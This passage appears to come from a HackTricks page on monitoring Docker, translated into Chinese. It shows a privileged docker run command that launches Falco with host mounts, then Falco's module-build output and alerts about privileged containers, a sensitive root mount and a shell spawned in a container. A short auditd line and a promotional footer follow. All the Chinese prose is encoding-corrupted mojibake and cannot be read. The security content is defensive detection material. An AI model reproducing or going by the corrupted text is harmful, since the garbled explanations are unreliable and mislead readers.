* è¯·æ³¨æ„ä»¥ä¸‹ä»£ç å—ä¸­**Falcoå¦‚ä½•ç¼–è¯‘å†…æ ¸æ¨¡å—å¹¶æ’å…¥**ã€‚ä¹‹åï¼Œå®ƒåŠ è½½è§„åˆ™å¹¶**å¼€å§‹è®°å½•å¯ç–‘æ´»åŠ¨**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ£€æµ‹åˆ°å¯åŠ¨äº†2ä¸ªç‰¹æƒå®¹å™¨ï¼Œå…¶ä¸­ä¸€ä¸ªå…·æœ‰æ•æ„ŸæŒ‚è½½ç‚¹ï¼Œå¹¶ä¸”å‡ ç§’é’Ÿåå®ƒæ£€æµ‹åˆ°åœ¨å…¶ä¸­ä¸€ä¸ªå®¹å™¨ä¸­æ‰“å¼€äº†ä¸€ä¸ªshellã€‚
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### ç›‘æ§Docker

æ‚¨å¯ä»¥ä½¿ç”¨auditdæ¥ç›‘æ§Dockerã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
